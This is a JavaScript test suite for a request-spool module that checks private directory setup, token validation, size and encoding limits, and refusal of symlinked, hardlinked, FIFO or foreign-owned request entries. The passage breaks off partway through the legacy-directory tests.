import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { createHash, randomBytes } from "node:crypto";
import {
  appendFile,
  chmod,
  link,
  lstat,
  mkdir,
  mkdtemp,
  readdir,
  readFile,
  rename,
  rm,
  rmdir,
  stat,
  symlink,
  truncate,
  writeFile,
} from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import test from "node:test";
import { normalizeConfig } from "../src/config.js";
import {
  REQUEST_ENTRY_MODE,
  REQUEST_MARKER_MODE,
  REQUEST_MARKER_NAME,
  REQUEST_MAX_BYTES,
  REQUEST_MAX_ENTRIES,
  REQUEST_SPOOL_MODE,
  assertLegacyRequestDirectoryEmpty,
  assertRequestSpoolEmpty,
  consumeRequest,
  inspectLegacyRequestDirectory,
  inspectRequestEntry,
  inspectRequestSpool,
  isRequestSpoolError,
  isValidRequestToken,
  removeRequestSpoolIfEmpty,
  requestSpoolInternals,
  requestSpoolRefusal,
  setupRequestSpool,
} from "../src/requests.js";
import { routeRequest } from "../src/routing.js";
import { PLATFORM_ERROR_CODE, platformInternals } from "../src/platform.js";

// Mode/uid assertions only carry meaning where the platform reports POSIX
// semantics; this suite runs them on POSIX and merely exercises the code path
// elsewhere. No Windows POSIX enforcement is claimed.
const posix = process.platform !== "win32";
const realUid = typeof process.getuid === "function" ? process.getuid() : 0;

const TOKEN = "0123456789abcdef0123456789abcdef";
const TOKEN_B = "fedcba9876543210fedcba9876543210";
const CLAIM_PATTERN = /^\.claim\.[a-f0-9]{32}\.[a-f0-9]{32}$/;

async function withTemp(run) {
  const root = await mkdtemp(path.join(os.tmpdir(), "skill-router-requests-"));
  try {
    return await run(root);
  } finally {
    await rm(root, { recursive: true, force: true });
  }
}

async function withInternals(overrides, run) {
  const saved = {};
  for (const key of Object.keys(overrides)) saved[key] = requestSpoolInternals[key];
  Object.assign(requestSpoolInternals, overrides);
  try {
    return await run();
  } finally {
    Object.assign(requestSpoolInternals, saved);
  }
}

async function freshSpool(root) {
  const directory = path.join(root, "spool");
  await setupRequestSpool(directory);
  return directory;
}

async function freshLegacy(root) {
  const directory = path.join(root, "legacy-requests");
  await mkdir(directory, { mode: 0o700 });
  if (posix) await chmod(directory, 0o700);
  return directory;
}

function publicPathOf(directory, token) {
  return path.join(directory, `${token}.txt`);
}

async function writePublic(directory, token, body) {
  await writeFile(publicPathOf(directory, token), body, { mode: 0o600 });
}

async function claimsOf(directory, token) {
  const names = await readdir(directory);
  return names.filter((name) => name.startsWith(`.claim.${token}.`));
}

async function writeClaim(directory, token, body, mode = 0o600) {
  const name = `.claim.${token}.${randomBytes(16).toString("hex")}`;
  await writeFile(path.join(directory, name), body, { mode });
  return name;
}

async function entryNames(directory) {
  return (await readdir(directory)).sort();
}

function fsError(code) {
  const error = new Error(code);
  error.code = code;
  return error;
}

function digestOf(body) {
  return createHash("sha256").update(body).digest("hex");
}

function leakText(value) {
  if (value instanceof Error) {
    const props = Object.fromEntries(Object.keys(value).map((key) => [key, value[key]]));
    return JSON.stringify({ name: value.name, message: value.message, code: value.code, props, stack: value.stack });
  }
  return JSON.stringify(value);
}

function assertNoLeak(value, needles) {
  const text = leakText(value);
  for (const needle of needles) {
    assert.ok(!text.includes(needle), `leaked ${JSON.stringify(needle.slice(0, 40))}`);
  }
}

function assertFixedError(error, code) {
  assert.ok(isRequestSpoolError(error), `expected a request spool error, got ${String(error)}`);
  assert.equal(error.code, code);
  assert.ok(error.message.length <= 120, "error messages stay bounded");
  assert.ok(!("cause" in error), "errors never carry a cause");
  assert.ok(!("path" in error), "errors never carry a path");
  assert.ok(!("errno" in error), "errors never carry errno text");
}

function rejectsWith(code) {
  return (error) => {
    assertFixedError(error, code);
    return true;
  };
}

// ---------------------------------------------------------------------------
// Spool setup: fresh, idempotent, modes, marker, owner, type, adoption
// ---------------------------------------------------------------------------

test("setup creates a fresh 0700 spool with an owner-only marker and is idempotent", async () => {
  await withTemp(async (root) => {
    const directory = path.join(root, "spool");
    const first = await setupRequestSpool(directory);
    assert.deepEqual(first, { created: true, adopted: false, mode: REQUEST_SPOOL_MODE });

    if (posix) {
      const dirStat = await stat(directory);
      assert.equal(dirStat.mode & 0o777, REQUEST_SPOOL_MODE, "spool directory is exactly 0700");
      assert.equal(dirStat.uid, realUid);
    }
    const marker = await lstat(path.join(directory, REQUEST_MARKER_NAME));
    assert.ok(marker.isFile(), "marker is a regular file");
    assert.ok(!marker.isSymbolicLink());
    if (posix) {
      assert.equal(marker.mode & 0o777, REQUEST_MARKER_MODE, "marker is owner-only");
      assert.equal(marker.mode & 0o077, 0);
    }
    assert.deepEqual(await entryNames(directory), [REQUEST_MARKER_NAME]);
    assert.deepEqual(await inspectRequestSpool(directory), { status: "ready", entries: 1 });

    const second = await setupRequestSpool(directory);
    assert.deepEqual(second, { created: false, adopted: false, mode: REQUEST_SPOOL_MODE });
    assert.deepEqual(await entryNames(directory), [REQUEST_MARKER_NAME], "idempotent retry changes nothing");
  });
});

test("setup adopts an empty current-owned directory and normalizes a wrong mode", async () => {
  await withTemp(async (root) => {
    // Empty, current-owned, but created with a group-readable mode.
    const directory = path.join(root, "adopted");
    await mkdir(directory, { mode: 0o755 });
    if (posix) await chmod(directory, 0o755);
    assert.equal((await inspectRequestSpool(directory)).status, "adoptable");

    const adopted = await setupRequestSpool(directory);
    assert.equal(adopted.created, false);
    assert.equal(adopted.adopted, true, "an empty current-owned directory is safely adopted");
    if (posix) assert.equal((await stat(directory)).mode & 0o777, REQUEST_SPOOL_MODE, "mode normalized to 0700");
    assert.deepEqual(await entryNames(directory), [REQUEST_MARKER_NAME]);
    assert.deepEqual(await inspectRequestSpool(directory), { status: "ready", entries: 1 });
  });
});

test("setup normalizes a wrongly-moded spool that already carries the marker", async () => {
  await withTemp(async (root) => {
    const directory = await freshSpool(root);
    if (posix) {
      await chmod(directory, 0o755);
      assert.equal((await inspectRequestSpool(directory)).status, "not-private");
    }
    const repaired = await setupRequestSpool(directory);
    assert.equal(repaired.created, false);
    assert.equal(repaired.adopted, false);
    if (posix) {
      assert.equal((await stat(directory)).mode & 0o777, REQUEST_SPOOL_MODE);
      assert.deepEqual(await inspectRequestSpool(directory), { status: "ready", entries: 1 });
    }
  });
});

test("setup refuses a nonempty unmarked directory and preserves its entries", async () => {
  await withTemp(async (root) => {
    const directory = path.join(root, "foreign");
    await mkdir(directory);
    await writeFile(path.join(directory, "notes.txt"), "keep me");
    await assert.rejects(setupRequestSpool(directory), rejectsWith("REQUEST-SPOOL-UNMARKED"));
    assert.deepEqual(await entryNames(directory), ["notes.txt"]);
    assert.equal((await inspectRequestSpool(directory)).status, "unmarked");
  });
});

test("setup refuses a non-directory, a symlink to a spool, and a foreign-owned spool", async () => {
  await withTemp(async (root) => {
    const file = path.join(root, "file");
    await writeFile(file, "x");
    await assert.rejects(setupRequestSpool(file), rejectsWith("REQUEST-SPOOL-TYPE"));
    assert.equal(await readFile(file, "utf8"), "x");

    const target = await freshSpool(root);
    const linkPath = path.join(root, "link");
    if (posix) {
      await symlink(target, linkPath);
      await assert.rejects(setupRequestSpool(linkPath), rejectsWith("REQUEST-SPOOL-TYPE"));
      assert.deepEqual(await entryNames(target), [REQUEST_MARKER_NAME], "linked spool untouched");
    }

    if (posix) {
      await assert.rejects(
        withInternals({ currentUid: () => realUid + 1 }, () => setupRequestSpool(target)),
        rejectsWith("REQUEST-SPOOL-OWNER"),
      );
    }
    await assert.rejects(setupRequestSpool(path.join(root, "missing", "deeper")), rejectsWith("REQUEST-SPOOL-CREATE"));
  });
});

test("setup refuses an invalid ownership marker", async () => {
  await withTemp(async (root) => {
    const directory = path.join(root, "bad-marker");
    await mkdir(directory);
    if (posix) await chmod(directory, REQUEST_SPOOL_MODE);
    const elsewhere = path.join(root, "elsewhere");
    await writeFile(elsewhere, "not a marker");
    await symlink(elsewhere, path.join(directory, REQUEST_MARKER_NAME));
    await assert.rejects(setupRequestSpool(directory), rejectsWith("REQUEST-SPOOL-MARKER"));
    assert.ok((await lstat(path.join(directory, REQUEST_MARKER_NAME))).isSymbolicLink(), "marker left untouched");
  });
});

test("inspect reports bounded states without echoing a path", async () => {
  await withTemp(async (root) => {
    const directory = path.join(root, "spool");
    assert.deepEqual(await inspectRequestSpool(directory), { status: "absent", entries: 0 });

    const file = path.join(root, "file");
    await writeFile(file, "x");
    assert.deepEqual(await inspectRequestSpool(file), { status: "not-a-directory", entries: 0 });

    await mkdir(path.join(root, "empty"));
    assert.deepEqual(await inspectRequestSpool(path.join(root, "empty")), { status: "adoptable", entries: 0 });

    const marked = await freshSpool(root);
    if (posix) {
      const foreignOwned = { status: "not-owned", entries: 0 };
      await withInternals({ currentUid: () => realUid + 1 }, async () => {
        assert.deepEqual(await inspectRequestSpool(marked), foreignOwned);
      });
    }

    const excessive = await withInternals(
      { readdirNames: async () => ({ names: [], overflow: true }) },
      () => inspectRequestSpool(marked),
    );
    assert.deepEqual(excessive, { status: "excessive", entries: null });

    const result = await inspectRequestSpool(marked);
    assert.ok(!leakText(result).includes(root), "inspect result carries no path");
  });
});

test("assert-empty and remove-empty only ever touch a provably empty spool", async () => {
  await withTemp(async (root) => {
    const directory = path.join(root, "spool");
    assert.deepEqual(await removeRequestSpoolIfEmpty(directory), { removed: false }, "absent spool removes nothing");

    await setupRequestSpool(directory);
    assert.deepEqual(await assertRequestSpoolEmpty(directory), { empty: true, present: true });

    const claim = await writeClaim(directory, TOKEN, "pending");
    await assert.rejects(assertRequestSpoolEmpty(directory), rejectsWith("REQUEST-SPOOL-NOT-EMPTY"));
    await assert.rejects(removeRequestSpoolIfEmpty(directory), rejectsWith("REQUEST-SPOOL-NOT-EMPTY"));
    assert.deepEqual(await entryNames(directory), [REQUEST_MARKER_NAME, claim].sort(), "claim preserved");
    assert.equal(await readFile(path.join(directory, claim), "utf8"), "pending");

    await rm(path.join(directory, claim));
    assert.deepEqual(await removeRequestSpoolIfEmpty(directory), { removed: true });
    await assert.rejects(lstat(directory), { code: "ENOENT" });
  });
});

test("remove-empty refuses and preserves its claim when entries reappear before the final rmdir", async () => {
  await withTemp(async (root) => {
    const directory = await freshSpool(root);
    let claimPath = null;
    await assert.rejects(
      withInternals(
        {
          rmdir: async (target) => {
            // A hostile entry reappears inside the proven directory claim
            // right before the non-recursive rmdir: the claim is preserved,
            // never forced.
            claimPath = target;
            await writeFile(path.join(target, "notes.txt"), "keep", { mode: 0o600 });
            throw fsError("ENOTEMPTY");
          },
        },
        () => removeRequestSpoolIfEmpty(directory),
      ),
      rejectsWith("REQUEST-SPOOL-NOT-EMPTY"),
    );
    // B2: the observed spool path was claimed (never guessed at), and the
    // proven-but-refused claim survives for a later verified pass.
    const rootEntries = await entryNames(root);
    assert.equal(rootEntries.includes("spool"), false, "the spool path was claimed, not left in place");
    assert.ok(claimPath, "the removal reached the claimed directory claim");
    assert.deepEqual(
      rootEntries.filter((name) => /^\.spool\.claim-[0-9a-f]{32}$/.test(name)),
      [path.basename(claimPath)],
      "exactly the proven directory claim is preserved",
    );
    assert.equal(rootEntries.some((name) => name.includes(".marker-")), false, "the marker claim was already consumed");
    assert.equal(
      await readFile(path.join(claimPath, "notes.txt"), "utf8"),
      "keep",
      "the racing entry survives inside the preserved claim",
    );

    // A nonempty spool is still refused before anything is claimed.
    const other = path.join(root, "spool2");
    await setupRequestSpool(other);
    await writeFile(path.join(other, "notes.txt"), "keep");
    await assert.rejects(removeRequestSpoolIfEmpty(other), rejectsWith("REQUEST-SPOOL-NOT-EMPTY"));
    assert.deepEqual(await entryNames(other), [REQUEST_MARKER_NAME, "notes.txt"], "nothing was touched");
  });
});

test("assert-empty and remove-empty refuse an unattributable directory", async () => {
  await withTemp(async (root) => {
    const directory = path.join(root, "foreign");
    await mkdir(directory);
    await assert.rejects(assertRequestSpoolEmpty(directory), rejectsWith("REQUEST-SPOOL-MARKER"));
    // The destructive removal also requires the exact 0700 spool shape, so a
    // bare directory refuses at the mode boundary before anything else.
    await assert.rejects(removeRequestSpoolIfEmpty(directory), rejectsWith("REQUEST-SPOOL-MODE"));
    const target = await freshSpool(root);
    if (posix) {
      const linkPath = path.join(root, "link");
      await symlink(target, linkPath);
      await assert.rejects(assertRequestSpoolEmpty(linkPath), rejectsWith("REQUEST-SPOOL-TYPE"));
      await assert.rejects(removeRequestSpoolIfEmpty(linkPath), rejectsWith("REQUEST-SPOOL-TYPE"));
    }
    assert.deepEqual(await entryNames(target), [REQUEST_MARKER_NAME]);
  });
});

// ---------------------------------------------------------------------------
// Token grammar and spool gating before any claim
// ---------------------------------------------------------------------------

test("token validation accepts exactly 32 lowercase hex characters and echoes nothing", async () => {
  assert.equal(isValidRequestToken(TOKEN), true);
  for (const invalid of [
    "",
    TOKEN.slice(0, 31),
    `${TOKEN}0`,
    TOKEN.toUpperCase(),
    `${TOKEN.slice(0, 31)}g`,
    ` ${TOKEN}`,
    `${TOKEN}\n`,
    "0x" + TOKEN.slice(2),
    undefined,
    null,
    42,
    {},
  ]) {
    assert.equal(isValidRequestToken(invalid), false, `rejected ${JSON.stringify(invalid)}`);
  }

  await withTemp(async (root) => {
    const directory = await freshSpool(root);
    for (const invalid of [TOKEN.toUpperCase(), `${TOKEN}0`, `../${"a".repeat(29)}`, ""]) {
      await assert.rejects(
        consumeRequest({ directory, token: invalid, route: async () => ({}) }),
        (error) => {
          assertFixedError(error, "REQUEST-TOKEN-INVALID");
          if (typeof invalid === "string" && invalid.length > 0) {
            assert.ok(!leakText(error).includes(invalid), "invalid token never echoed");
          }
          return true;
        },
      );
    }
    assert.deepEqual(await entryNames(directory), [REQUEST_MARKER_NAME], "nothing consumed or created");
  });
});

test("consumption is gated on a valid, private, marked spool", async () => {
  await withTemp(async (root) => {
    const missing = path.join(root, "missing");
    await assert.rejects(
      consumeRequest({ directory: missing, token: TOKEN, route: async () => ({}) }),
      rejectsWith("REQUEST-SPOOL-ABSENT"),
    );

    const unmarked = path.join(root, "unmarked");
    await mkdir(unmarked);
    if (posix) await chmod(unmarked, REQUEST_SPOOL_MODE);
    await writePublic(unmarked, TOKEN, "ship it");
    await assert.rejects(
      consumeRequest({ directory: unmarked, token: TOKEN, route: async () => ({}) }),
      rejectsWith("REQUEST-SPOOL-UNMARKED"),
    );
    assert.equal(await readFile(publicPathOf(unmarked, TOKEN), "utf8"), "ship it", "public bytes preserved");

    const directory = await freshSpool(root);
    await writePublic(directory, TOKEN, "ship it");
    if (posix) {
      await chmod(directory, 0o755);
      await assert.rejects(
        consumeRequest({ directory, token: TOKEN, route: async () => ({}) }),
        rejectsWith("REQUEST-SPOOL-MODE"),
      );
      assert.equal(await readFile(publicPathOf(directory, TOKEN), "utf8"), "ship it", "public bytes preserved");
      await chmod(directory, REQUEST_SPOOL_MODE);
    }
    if (posix) {
      await assert.rejects(
        withInternals({ currentUid: () => realUid + 1 }, () =>
          consumeRequest({ directory, token: TOKEN, route: async () => ({}) }),
        ),
        rejectsWith("REQUEST-SPOOL-OWNER"),
      );
    }
    await assert.rejects(
      consumeRequest({ directory, token: TOKEN }),
      rejectsWith("REQUEST-ROUTE-INVALID"),
    );
    await assert.rejects(
      consumeRequest({ directory, token: TOKEN, route: "not a function" }),
      rejectsWith("REQUEST-ROUTE-INVALID"),
    );
    assert.equal(await readFile(publicPathOf(directory, TOKEN), "utf8"), "ship it");
  });
});

// ---------------------------------------------------------------------------
// Ordinary consumption, size bounds, decoding
// ---------------------------------------------------------------------------

test("an ordinary request is claimed privately, routed, and removed exactly once", async () => {
  await withTemp(async (root) => {
    const directory = await freshSpool(root);
    const body = "review the change and run its tests\n";
    await writePublic(directory, TOKEN, body);

    const seen = [];
    const result = await consumeRequest({
      directory,
      token: TOKEN,
      route: async (request) => {
        seen.push(request);
        const names = await readdir(directory);
        assert.ok(!names.includes(`${TOKEN}.txt`), "public entry is gone before the callback runs");
        const claims = names.filter((name) => name !== REQUEST_MARKER_NAME);
        assert.equal(claims.length, 1, "exactly one claim exists during the callback");
        assert.match(claims[0], CLAIM_PATTERN, "claim name carries the token plus a random nonce");
        const claimStat = await stat(path.join(directory, claims[0]));
        assert.ok(claimStat.isFile());
        assert.equal(claimStat.nlink, 1);
        if (posix) {
          assert.equal(claimStat.mode & 0o777, REQUEST_ENTRY_MODE, "claim is normalized to 0600 before reading");
          assert.equal(claimStat.uid, realUid);
        }
        assert.equal(await readFile(path.join(directory, claims[0]), "utf8"), body, "claim holds the exact bytes");
        return { outcome: "select", skillId: "code-review" };
      },
    });

    assert.deepEqual(seen, [body], "the callback received the exact request text");
    assert.deepEqual(result, { outcome: "select", skillId: "code-review" }, "callback result returned verbatim");
    assert.deepEqual(await entryNames(directory), [REQUEST_MARKER_NAME], "claim removed and directory synced");
    await assert.rejects(
      consumeRequest({ directory, token: TOKEN, route: async () => ({}) }),
      rejectsWith("REQUEST-ABSENT"),
      "the token is not deliverable a second time",
    );
  });
});

test("exactly 100000 bytes are accepted and 100001 bytes are refused with the public entry intact", async () => {
  await withTemp(async (root) => {
    const directory = await freshSpool(root);
    const body = "a".repeat(REQUEST_MAX_BYTES);
    await writePublic(directory, TOKEN, body);
    const seen = [];
    await consumeRequest({ directory, token: TOKEN, route: async (request) => { seen.push(request.length); return {}; } });
    assert.deepEqual(seen, [REQUEST_MAX_BYTES]);
    assert.deepEqual(await entryNames(directory), [REQUEST_MARKER_NAME]);

    const oversized = "b".repeat(REQUEST_MAX_BYTES + 1);
    await writePublic(directory, TOKEN, oversized);
    await assert.rejects(
      consumeRequest({ directory, token: TOKEN, route: async () => ({}) }),
      rejectsWith("REQUEST-ENTRY-TOO-LARGE"),
    );
    assert.deepEqual(await claimsOf(directory, TOKEN), [], "no claim was created");
    assert.equal((await stat(publicPathOf(directory, TOKEN))).size, REQUEST_MAX_BYTES + 1, "public bytes preserved");
    assert.equal(await readFile(publicPathOf(directory, TOKEN), "utf8"), oversized);
  });
});

test("a body that grows past the bound during the read is refused after at most 100001 bytes", async () => {
  await withTemp(async (root) => {
    const directory = await freshSpool(root);
    await writePublic(directory, TOKEN, "x".repeat(1000));

    let requested = 0;
    let appended = false;
    const realRead = requestSpoolInternals.handleRead;
    await withInternals(
      {
        handleRead: async (handle, buffer, offset, length, position) => {
          const outcome = await realRead(handle, buffer, offset, length, position);
          requested += outcome.bytesRead;
          if (!appended && outcome.bytesRead > 0) {
            appended = true;
            const [claim] = await claimsOf(directory, TOKEN);
            await appendFile(path.join(directory, claim), "y".repeat(200_000));
          }
          return outcome;
        },
      },
      async () => {
        await assert.rejects(
          consumeRequest({ directory, token: TOKEN, route: async () => ({}) }),
          rejectsWith("REQUEST-ENTRY-TOO-LARGE"),
        );
      },
    );

    assert.ok(requested <= REQUEST_MAX_BYTES + 1, `read ${requested} bytes, must never exceed 100001`);
    assert.ok(requested > REQUEST_MAX_BYTES, "the bound was actually exercised");
    const [claim] = await claimsOf(directory, TOKEN);
    assert.equal((await stat(path.join(directory, claim))).size, 1000 + 200_000, "grown claim preserved");
  });
});

test("strict UTF-8 decoding refuses invalid sequences and preserves the claim bytes", async () => {
  await withTemp(async (root) => {
    const directory = await freshSpool(root);
    const bytes = Buffer.from([0x68, 0x69, 0xff, 0xfe, 0x21]);
    await writeFile(publicPathOf(directory, TOKEN), bytes, { mode: 0o600 });
    await assert.rejects(
      consumeRequest({ directory, token: TOKEN, route: async () => ({}) }),
      rejectsWith("REQUEST-ENCODING"),
    );
    const [claim] = await claimsOf(directory, TOKEN);
    assert.ok(claim, "the interrupted claim survives");
    assert.deepEqual(await readFile(path.join(directory, claim)), bytes, "claim bytes unchanged");

    const truncated = Buffer.from([0xe2, 0x82]);
    await writeClaim(directory, TOKEN_B, truncated);
    await assert.rejects(
      consumeRequest({ directory, token: TOKEN_B, route: async () => ({}) }),
      rejectsWith("REQUEST-ENCODING"),
    );
  });
});

test("empty and whitespace-only bodies are refused exactly like routing does", async () => {
  await withTemp(async (root) => {
    const directory = await freshSpool(root);
    for (const [index, body] of ["", " ", " \n\t\r\n "].entries()) {
      const token = index === 0 ? TOKEN : index === 1 ? TOKEN_B : "0".repeat(31) + "1";
      await writePublic(directory, token, body);
      await assert.rejects(
        consumeRequest({ directory, token, route: async () => ({}) }),
        rejectsWith("REQUEST-BODY-EMPTY"),
      );
      const [claim] = await claimsOf(directory, token);
      assert.equal(await readFile(path.join(directory, claim), "utf8"), body, "empty claim preserved");
    }
    // The same predicate routing applies to a request string.
    assert.throws(() => routeRequest("   ", { skills: [] }, normalizeConfig()), /non-empty string/);
  });
});

// ---------------------------------------------------------------------------
// Hostile entry shapes: symlink, directory, FIFO, hardlink, wrong owner
// ---------------------------------------------------------------------------

test("a symlink at the public path is refused without touching the target", async (t) => {
  if (!posix) return t.skip("symlink creation needs POSIX semantics");
  await withTemp(async (root) => {
    const directory = await freshSpool(root);
    const target = path.join(root, "target.txt");
    const body = "secret target bytes";
    await writeFile(target, body, { mode: 0o600 });
    await symlink(target, publicPathOf(directory, TOKEN));

    await assert.rejects(
      consumeRequest({ directory, token: TOKEN, route: async () => ({}) }),
      rejectsWith("REQUEST-ENTRY-TYPE"),
    );
    assert.equal(await readFile(target, "utf8"), body, "symlink target preserved");
    assert.ok((await lstat(publicPathOf(directory, TOKEN))).isSymbolicLink(), "symlink preserved");
    assert.deepEqual(await claimsOf(directory, TOKEN), [], "no claim created");
  });
});

test("a directory at the public path is refused", async () => {
  await withTemp(async (root) => {
    const directory = await freshSpool(root);
    const nested = publicPathOf(directory, TOKEN);
    await mkdir(nested);
    await writeFile(path.join(nested, "inner"), "keep");
    await assert.rejects(
      consumeRequest({ directory, token: TOKEN, route: async () => ({}) }),
      rejectsWith("REQUEST-ENTRY-TYPE"),
    );
    assert.equal(await readFile(path.join(nested, "inner"), "utf8"), "keep", "directory contents preserved");
  });
});

test("a FIFO at the public path is refused without opening it", async (t) => {
  await withTemp(async (root) => {
    const directory = await freshSpool(root);
    const fifo = publicPathOf(directory, TOKEN);
    if (spawnSync("mkfifo", [fifo]).status !== 0) return t.skip("mkfifo unavailable on this host");
    await assert.rejects(
      consumeRequest({ directory, token: TOKEN, route: async () => ({}) }),
      rejectsWith("REQUEST-ENTRY-TYPE"),
    );
    assert.ok((await lstat(fifo)).isFIFO(), "FIFO preserved");
    assert.deepEqual(await claimsOf(directory, TOKEN), [], "no claim created");
  });
});

test("a hardlinked public entry is refused and both links survive", async (t) => {
  if (!posix) return t.skip("hardlinks need POSIX semantics");
  await withTemp(async (root) => {
    const directory = await freshSpool(root);
    const body = "linked request";
    await writePublic(directory, TOKEN, body);
    const alias = path.join(root, "alias.bin");
    await link(publicPathOf(directory, TOKEN), alias);

    await assert.rejects(
      consumeRequest({ directory, token: TOKEN, route: async () => ({}) }),
      rejectsWith("REQUEST-ENTRY-HARDLINK"),
    );
    assert.equal(await readFile(publicPathOf(directory, TOKEN), "utf8"), body);
    assert.equal(await readFile(alias, "utf8"), body, "the second link survives");
    assert.deepEqual(await claimsOf(directory, TOKEN), []);
  });
});

test("a foreign-owned public entry is refused, and uid checks apply only where uid semantics exist", async () => {
  await withTemp(async (root) => {
    const directory = await freshSpool(root);
    await writePublic(directory, TOKEN, "ship it");
    const realLstat = requestSpoolInternals.lstat;
    const realHandleStat = requestSpoolInternals.handleStat;
    const foreign = (statLike) => ({
      dev: statLike.dev,
      ino: statLike.ino,
      uid: realUid + 1,
      mode: statLike.mode,
      size: statLike.size,
      nlink: statLike.nlink,
      isFile: () => statLike.isFile(),
      isDirectory: () => statLike.isDirectory(),
      isSymbolicLink: () => statLike.isSymbolicLink(),
    });

    if (posix) {
      await withInternals(
        {
          lstat: async (target) => {
            const statLike = await realLstat(target);
            return String(target).endsWith(".txt") ? foreign(statLike) : statLike;
          },
        },
        async () => {
          await assert.rejects(
            consumeRequest({ directory, token: TOKEN, route: async () => ({}) }),
            rejectsWith("REQUEST-ENTRY-OWNER"),
          );
        },
      );
      assert.equal(await readFile(publicPathOf(directory, TOKEN), "utf8"), "ship it", "public bytes preserved");
      assert.deepEqual(await claimsOf(directory, TOKEN), []);

      await withInternals(
        { handleStat: async (handle) => foreign(await realHandleStat(handle)) },
        async () => {
          await assert.rejects(
            consumeRequest({ directory, token: TOKEN, route: async () => ({}) }),
            rejectsWith("REQUEST-ENTRY-OWNER"),
          );
        },
      );
      assert.deepEqual(await claimsOf(directory, TOKEN), [], "fstat refusal happens before the rename");
      assert.equal(await readFile(publicPathOf(directory, TOKEN), "utf8"), "ship it");
    }

    // Where the platform reports no uid semantics the check cannot apply.
    await withInternals(
      { uidSemantics: () => false, currentUid: () => realUid + 1 },
      async () => {
        const result = await consumeRequest({
          directory,
          token: TOKEN,
          route: async (request) => ({ outcome: "none", request }),
        });
        assert.deepEqual(result, { outcome: "none", request: "ship it" });
      },
    );
    assert.deepEqual(await entryNames(directory), [REQUEST_MARKER_NAME]);
  });
});

// ---------------------------------------------------------------------------
// Claims: resume, ambiguity, enumeration grammar and bounds
// ---------------------------------------------------------------------------

test("one interrupted claim resumes and is consumed exactly once", async () => {
  await withTemp(async (root) => {
    const directory = await freshSpool(root);
    const body = "crash resume me";
    const claim = await writeClaim(directory, TOKEN, body, 0o644);
    if (posix) {
      assert.equal((await stat(path.join(directory, claim))).mode & 0o777, 0o644, "claim starts with a loose mode");
    }

    const seen = [];
    const result = await consumeRequest({
      directory,
      token: TOKEN,
      route: async (request) => {
        seen.push(request);
        if (posix) {
          assert.equal((await stat(path.join(directory, claim))).mode & 0o777, REQUEST_ENTRY_MODE);
        }
        return { outcome: "select", skillId: "git-release" };
      },
    });
    assert.deepEqual(seen, [body]);
    assert.deepEqual(result, { outcome: "select", skillId: "git-release" });
    assert.deepEqual(await entryNames(directory), [REQUEST_MARKER_NAME], "the exact claim was removed");
  });
});

test("multiple claims for one token are ambiguity and nothing is consumed", async () => {
  await withTemp(async (root) => {
    const directory = await freshSpool(root);
    const first = await writeClaim(directory, TOKEN, "first");
    const second = await writeClaim(directory, TOKEN, "second");
    await assert.rejects(
      consumeRequest({ directory, token: TOKEN, route: async () => ({}) }),
      rejectsWith("REQUEST-AMBIGUOUS"),
    );
    assert.deepEqual(await entryNames(directory), [REQUEST_MARKER_NAME, first, second].sort());
    assert.equal(await readFile(path.join(directory, first), "utf8"), "first");
    assert.equal(await readFile(path.join(directory, second), "utf8"), "second");
  });
});

test("a public entry beside a claim for the same token is ambiguity", async () => {
  await withTemp(async (root) => {
    const directory = await freshSpool(root);
    await writePublic(directory, TOKEN, "public body");
    const claim = await writeClaim(directory, TOKEN, "claim body");
    await assert.rejects(
      consumeRequest({ directory, token: TOKEN, route: async () => ({}) }),
      rejectsWith("REQUEST-AMBIGUOUS"),
    );
    assert.equal(await readFile(publicPathOf(directory, TOKEN), "utf8"), "public body");
    assert.equal(await readFile(path.join(directory, claim), "utf8"), "claim body");
  });
});

test("claim enumeration uses the exact grammar and a bounded scan", async () => {
  await withTemp(async (root) => {
    const directory = await freshSpool(root);
    // Look-alikes that must never count as claims for this token.
    const nearMisses = [
      `.claim.${TOKEN}.nothexnothexnothexnothexnothexno`,
      `.claim.${TOKEN.toUpperCase()}.${"a".repeat(32)}`,
      `.claim.${TOKEN}.${"a".repeat(31)}`,
      `claim.${TOKEN}.${"a".repeat(32)}`,
      `.claim.${TOKEN}.${"a".repeat(32)}.extra`,
    ];
    for (const name of nearMisses) await writeFile(path.join(directory, name), "keep");
    await writePublic(directory, TOKEN, "ship it");

    const seen = [];
    await consumeRequest({ directory, token: TOKEN, route: async (request) => { seen.push(request); return {}; } });
    assert.deepEqual(seen, ["ship it"], "look-alikes did not create ambiguity");
    const remaining = await entryNames(directory);
    for (const name of nearMisses) assert.ok(remaining.includes(name), `${name} preserved`);
  });

  await withTemp(async (root) => {
    const directory = await freshSpool(root);
    await writePublic(directory, TOKEN, "ship it");
    await assert.rejects(
      withInternals(
        { readdirNames: async () => ({ names: [], overflow: true }) },
        () => consumeRequest({ directory, token: TOKEN, route: async () => ({}) }),
      ),
      rejectsWith("REQUEST-SPOOL-ENTRIES"),
    );
    assert.equal(await readFile(publicPathOf(directory, TOKEN), "utf8"), "ship it", "public bytes preserved");
  });

  await withTemp(async (root) => {
    const directory = await freshSpool(root);
    for (let index = 0; index < REQUEST_MAX_ENTRIES; index += 1) {
      await writeFile(path.join(directory, `filler-${index}.txt`), "x");
    }
    await writePublic(directory, TOKEN, "ship it");
    await assert.rejects(
      consumeRequest({ directory, token: TOKEN, route: async () => ({}) }),
      rejectsWith("REQUEST-SPOOL-ENTRIES"),
    );
    assert.equal(await readFile(publicPathOf(directory, TOKEN), "utf8"), "ship it");
    const inspect = await inspectRequestSpool(directory);
    assert.equal(inspect.status, "excessive", "inspection reports the bound without listing names");
  });
});

// ---------------------------------------------------------------------------
// Stable and legacy directories
// ---------------------------------------------------------------------------

test("the stable spool wins only when the legacy directory has no same token", async () => {
  await withTemp(async (root) => {
    const directory = await freshSpool(root);
    const legacy = await freshLegacy(root);
    await writePublic(directory, TOKEN, "stable body");
    await writePublic(legacy, TOKEN_B, "other legacy body");

    const seen = [];
    await consumeRequest({
      directory,
      legacyDirectory: legacy,
      token: TOKEN,
      route: async (request) => { seen.push(request); return { outcome: "none" }; },
    });
    assert.deepEqual(seen, ["stable body"]);
    assert.deepEqual(await entryNames(directory), [REQUEST_MARKER_NAME]);
    assert.equal(await readFile(publicPathOf(legacy, TOKEN_B), "utf8"), "other legacy body", "legacy entry untouched");
  });
});

test("a legacy-only token is consumed from the legacy directory", async () => {
  await withTemp(async (root) => {
    const directory = await freshSpool(root);
    const legacy = await freshLegacy(root);
    await writePublic(legacy, TOKEN, "legacy body");

    const result = await consumeRequest({
      directory,
      legacyDirectory: legacy,
      token: TOKEN,
      route: async (request) => ({ outcome: "none", request }),
    });
